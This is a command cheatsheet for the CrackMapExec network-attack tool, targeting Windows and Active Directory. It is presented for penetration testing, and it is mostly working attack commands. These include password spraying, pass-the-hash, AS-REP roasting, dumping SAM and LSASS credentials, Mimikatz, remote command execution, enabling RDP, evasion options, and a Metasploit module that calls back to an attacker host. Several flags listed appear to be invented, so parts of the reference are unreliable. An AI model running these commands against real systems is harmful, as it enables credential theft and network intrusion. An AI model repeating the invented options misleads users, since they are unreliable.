## SUMMARY

- Automates network attacks against Windows/Active Directory
- Supports multiple protocols (SMB/WinRM/MSSQL/SSH/LDAP)
- Enables credential attacks and lateral movement
- Provides extensive post-exploitation capabilities
- Integrates with BloodHound, Metasploit, and other tools

## Primary Use Cases:

✅ Penetration Testing
✅ Red Team Operations
✅ Active Directory Auditing
✅ Network Security Assessments

## Cheatsheet

```bash
## INSTALLATION & SETUP
# Install on Kali
sudo apt update && sudo apt install crackmapexec

# Install via pipx (recommended)
pipx install crackmapexec

# Update to latest version
pipx upgrade crackmapexec

# Verify installation
crackmapexec -v

## BASIC SCANNING
# Basic SMB scan
crackmapexec smb 192.168.1.0/24

# Scan specific ports
crackmapexec smb 192.168.1.0/24 -ports 445,139,5985

# Fast scan (no detailed info)
crackmapexec smb 192.168.1.0/24 --fast

# Ping sweep
crackmapexec smb 192.168.1.0/24 --ping

## CREDENTIAL ATTACKS
# Password spray (SMB)
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# Pass-the-Hash
crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Kerberos authentication
crackmapexec smb 192.168.1.100 -u user -k -d domain.local

# AS-REP Roasting
crackmapexec ldap 192.168.1.100 -u users.txt -p '' --asreproast asreproast.txt

## POST-EXPLOITATION
# Execute commands
crackmapexec smb 192.168.1.100 -u admin -p Password123 -x 'whoami /all'

# Dump SAM
crackmapexec smb 192.168.1.100 -u admin -p Password123 --sam

# Dump LSASS
crackmapexec smb 192.168.1.100 -u admin -p Password123 --lsa

# Mimikatz (sekurlsa)
crackmapexec smb 192.168.1.100 -u admin -p Password123 -M mimikatz

## LATERAL MOVEMENT
# Create scheduled task
crackmapexec smb 192.168.1.100 -u admin -p Password123 -X 'schtasks /create /tn "Task" /tr "cmd.exe /c calc.exe" /sc once /st 00:00'

# Enable RDP
crackmapexec smb 192.168.1.100 -u admin -p Password123 -M rdp -o ACTION=enable

# Pass-the-Ticket
crackmapexec smb 192.168.1.100 -u user -p pass --use-kcache

## MODULE SYSTEM
# List all modules
crackmapexec smb -L

# Run specific module
crackmapexec smb 192.168.1.100 -u admin -p Password123 -M <module>

# Popular modules:
# - mimikatz          - netripper
# - inveigh           - rdp
# - spider_plus       - metasploit
# - sharpview         - safetykatz

## PROTOCOL SUPPORT
# SMB (primary)
crackmapexec smb <target> [options]

# WinRM
crackmapexec winrm <target> -u user -p pass

# MSSQL
crackmapexec mssql <target> -u sa -p password --query "SELECT name FROM master..sysdatabases"

# SSH
crackmapexec ssh <target> -u root -p password -x 'id'

# LDAP
crackmapexec ldap <target> -u user -p pass --kdcHost dc.domain.local

## OUTPUT & LOGGING
# Save results to file
crackmapexec smb 192.168.1.0/24 --output-file results.txt

# JSON output
crackmapexec smb 192.168.1.0/24 --json

# Greppable output
crackmapexec smb 192.168.1.0/24 --grep

# BloodHound collection
crackmapexec smb 192.168.1.0/24 -u user -p pass --bloodhound -c All

## TUNING & OPTIMIZATION
# Set timeout
crackmapexec smb 192.168.1.0/24 --timeout 5

# Set threads
crackmapexec smb 192.168.1.0/24 --threads 15

# Continue previous session
crackmapexec --continue previous_session.db

## DEFENSE EVASION
# Random delay
crackmapexec smb 192.168.1.0/24 --delay 30-90

# Stealth mode
crackmapexec smb 192.168.1.0/24 --stealth

# Custom user-agent
crackmapexec smb 192.168.1.0/24 --user-agent "Mozilla/5.0"

## TROUBLESHOOTING
# Debug mode
crackmapexec smb 192.168.1.0/24 --debug

# Show help
crackmapexec -h

# Module help
crackmapexec smb -M <module> -o HELP=true

## INTEGRATION
# Metasploit session
crackmapexec smb 192.168.1.100 -u admin -p pass -M metasploit -o LHOST=192.168.1.50 LPORT=4444

# NTLM Relay
crackmapexec smb --ntlm-relay <target>

# Responder integration
crackmapexec smb 192.168.1.0/24 -M inveigh -o LHOST=192.168.1.50

```
